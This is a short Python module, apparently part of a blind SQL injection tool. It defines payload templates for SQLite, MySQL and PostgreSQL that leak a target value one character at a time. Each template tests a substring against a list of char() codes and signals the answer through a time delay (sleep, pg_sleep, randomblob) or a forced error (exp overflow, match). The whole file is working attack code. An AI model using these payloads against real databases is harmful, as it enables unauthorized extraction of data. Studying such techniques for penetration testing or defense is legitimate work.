class db(object):
    delay = 1
    escape_format = 'char(%d)'

    def __init__(self, expr, position, collection, tail=''):
        self.expr = expr
        self.tail = tail
        self.position = position
        self.collection = self.escape_collection(collection)

    def escape(self, c):
        return self.escape_format % ord(c)

    def escape_collection(self, collection):
        return ','.join(map(self.escape, collection))

    def query(self):
        return self.plain_query.format(expr=self.expr, pos=self.position, col=self.collection, tail=self.tail)

    def timing(self, delay=None):
        if delay is None:
            delay = self.delay

        return self.timing_query.format(query=self.query(), delay=delay)

    def error(self):
        return self.error_query.format(query=self.query())


class sqlite(db):
    delay = 300000000
    plain_query = 'SELECT substr({expr}, {pos}+1, 1) IN ({col}) {tail}'
    timing_query = 'CASE ({query}) WHEN 1 THEN 1 ELSE 1=randomblob({delay}) END'
    error_query = 'CASE ({query}) WHEN 1 THEN 1 ELSE match(1,1) END'


class mysql(db):
    plain_query = 'SELECT substr({expr}, {pos}+1, 1) IN ({col}) {tail}'
    timing_query = 'if(({query}), 1, sleep({delay})'
    error_query = 'if(({query}), 1, exp(710))'


class postgres(db):
    plain_query = 'SELECT substr({expr}, {pos}+1, 1) IN ({col}) {tail}'
    timing_query = 'case when({query}) then 0 else pg_sleep({delay}) end'
    error_query = 'exp(700 + case when ({query}) then 0 else 10 end)'
